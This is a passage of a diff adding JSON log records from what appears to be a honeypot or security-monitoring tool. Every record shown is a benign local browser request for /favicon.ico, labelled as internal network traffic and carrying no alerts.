+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233539-61769",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:19.469865+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233549-62842",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:29.503101+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233559-49672",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:39.551079+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233569-62817",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:49.599006+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233579-57534",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:59.645079+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233589-51533",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:09.690674+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233599-51434",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:19.737599+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233609-50754",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:29.778844+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233619-51288",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:39.825378+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233629-52733",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:49.866025+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233639-53213",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:13:59.909357+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233649-65449",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:14:09.965977+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233659-58658",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:14:19.980847+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233670-55594",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:14:30.026153+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233680-59742",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:14:40.074051+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233690-51600",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:14:50.110301+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233700-50286",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:00.141827+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233710-54982",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:10.170372+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233720-54446",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:20.206633+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233730-60673",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:30.245786+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233740-57285",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:40.291630+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233750-59695",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:15:50.336680+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
